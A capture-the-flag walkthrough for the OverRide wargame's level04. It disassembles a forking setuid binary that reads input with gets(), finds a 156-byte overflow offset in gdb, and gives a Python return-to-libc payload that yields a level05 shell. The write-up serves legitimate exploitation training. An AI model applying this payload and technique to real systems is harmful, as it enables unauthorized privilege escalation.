# Walkthrough

Upon connecting to `level04`, I discovered a binary file named `level04`. Upon executing the file, it prompted for user input.

```
level04@OverRide:~$ ./level04
Give me some shellcode, k
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZAAAABBBBCCCCDDDDEEEEFFFF
child is exiting...
```

To better understand the program's behavior, I used `gdb` to debug it. The program started by calling the `main` function, which then forked the process and cleared a buffer.

```s
   0x080486d6 <+14>: call   0x8048550 <fork@plt>
   0x080486db <+19>: mov    DWORD PTR [esp+0xac],eax
   0x080486e2 <+26>: lea    ebx,[esp+0x20]
   0x080486e6 <+30>: mov    eax,0x0
   0x080486eb <+35>: mov    edx,0x20
   0x080486f0 <+40>: mov    edi,ebx
   0x080486f2 <+42>: mov    ecx,edx
   0x080486f4 <+44>: rep stos DWORD PTR es:[edi],eax
```

The main function then checked if the process was a child process by comparing its pid to zero using the `fork` function. If it was a child process, it used the `ptrace` function to allow the parent process to gain control over the child process's execution, which is useful for debugging and controlling the behavior of a running process. The child process then displayed the message `"Give me some shellcode, k"` and waited for user input to store it in the previously cleared buffer.

```
   0x08048713 <+75>: mov    DWORD PTR [esp+0x4],0x1
   0x0804871b <+83>: mov    DWORD PTR [esp],0x1
   0x08048722 <+90>: call   0x8048540 <prctl@plt>
   0x08048727 <+95>: mov    DWORD PTR [esp+0xc],0x0
   0x0804872f <+103>: mov    DWORD PTR [esp+0x8],0x0
   0x08048737 <+111>: mov    DWORD PTR [esp+0x4],0x0
   0x0804873f <+119>: mov    DWORD PTR [esp],0x0
   0x08048746 <+126>: call   0x8048570 <ptrace@plt>
   0x0804874b <+131>: mov    DWORD PTR [esp],0x8048903
   0x08048752 <+138>: call   0x8048500 <puts@plt>
   0x08048757 <+143>: lea    eax,[esp+0x20]
   0x0804875b <+147>: mov    DWORD PTR [esp],eax
   0x0804875e <+150>: call   0x80484b0 <gets@plt>
   0x08048763 <+155>: jmp    0x804881a <main+338>
```

If it was not a child process, it waited for the child process to finish using the `wait` function. If the child process encountered an issue, the `wait` function changed the value of the address provided to it to a non-zero value and then killed the pid returned by the `fork` function. If no issues were encountered, the program displayed `"child is exiting..."`

```
   0x08048769 <+161>: lea    eax,[esp+0x1c]
   0x0804876d <+165>: mov    DWORD PTR [esp],eax
   0x08048770 <+168>: call   0x80484f0 <wait@plt>
   0x08048775 <+173>: mov    eax,DWORD PTR [esp+0x1c]
   0x08048779 <+177>: mov    DWORD PTR [esp+0xa0],eax
   0x08048780 <+184>: mov    eax,DWORD PTR [esp+0xa0]
   0x08048787 <+191>: and    eax,0x7f
   0x0804878a <+194>: test   eax,eax
   0x0804878c <+196>: je     0x80487ac <main+228>
   0x0804878e <+198>: mov    eax,DWORD PTR [esp+0x1c]
   0x08048792 <+202>: mov    DWORD PTR [esp+0xa4],eax
   0x08048799 <+209>: mov    eax,DWORD PTR [esp+0xa4]
   0x080487a0 <+216>: and    eax,0x7f
   0x080487a3 <+219>: add    eax,0x1
   0x080487a6 <+222>: sar    al,1
   0x080487a8 <+224>: test   al,al
   0x080487aa <+226>: jle    0x80487ba <main+242>
   0x080487ac <+228>: mov    DWORD PTR [esp],0x804891d
   0x080487b3 <+235>: call   0x8048500 <puts@plt>
   0x080487b8 <+240>: jmp    0x804881a <main+338>
   0x080487ba <+242>: mov    DWORD PTR [esp+0xc],0x0
   0x080487c2 <+250>: mov    DWORD PTR [esp+0x8],0x2c
   0x080487ca <+258>: mov    eax,DWORD PTR [esp+0xac]
   0x080487d1 <+265>: mov    DWORD PTR [esp+0x4],eax
   0x080487d5 <+269>: mov    DWORD PTR [esp],0x3
   0x080487dc <+276>: call   0x8048570 <ptrace@plt>
   0x080487e1 <+281>: mov    DWORD PTR [esp+0xa8],eax
   0x080487e8 <+288>: cmp    DWORD PTR [esp+0xa8],0xb
   0x080487f0 <+296>: jne    0x8048768 <main+160>
   0x080487f6 <+302>: mov    DWORD PTR [esp],0x8048931
   0x080487fd <+309>: call   0x8048500 <puts@plt>
   0x08048802 <+314>: mov    DWORD PTR [esp+0x4],0x9
   0x0804880a <+322>: mov    eax,DWORD PTR [esp+0xac]
   0x08048811 <+329>: mov    DWORD PTR [esp],eax
   0x08048814 <+332>: call   0x8048520 <kill@plt>
```

In this case, the `gets` function is used without specifying a size, which can lead to a buffer overflow. To perform a `return-to-libc` attack, the offset between the buffer's address and the return function's address must be determined. By changing the return value to the address of the `system` function, a new shell process can be started.

To track the child process using `gdb`, it is necessary to set the `follow-fork-mode` option to `"child"`. This will enable `gdb` to attach to the child process after it is forked from the parent process.

```s
(gdb) set follow-fork-mode child
(gdb) b *0x0804875e
(gdb) x/wx $esp+0x20 # the address of the buffer
0xffffd630: 0x00000000
(gdb) x/wx $ebp+4 # the address of the return
0xffffd6cc: 0xf7e45513
```

To determine the required size, i need to calculate the difference between the address of the buffer and the address of the `return` function:

```sh
level04@OverRide:~$ python2
Python 2.7.3 (default, Jun 22 2015, 19:33:41)
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0xffffd6cc - 0xffffd630
156
```

So what I'm gonna do now is use `Python` to create a string that will overflow the buffer. This string has to be just the right length so that it can fill up the buffer and overwrite the return address with the system function's address.

```
level04@OverRide:~$ python2 -c 'print( "A" * 156 +"\xf7\xe6\xae\xd0"[::-1]) + "BBBB" + "\xf7\xf8\x97\xec"[::-1]' > /tmp/flag
level04@OverRide:~$ cat /tmp/flag - | ./level04
Give me some shellcode, k
whoami
level05
cd ../level05
ls -la
total 17
dr-xr-x---+ 1 level05 level05   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level05 level05  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level05 level05 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level06 users   5176 Sep 10  2016 level05
-rw-r--r--+ 1 level05 level05   41 Oct 19  2016 .pass
-rw-r--r--  1 level05 level05  675 Sep 10  2016 .profile
```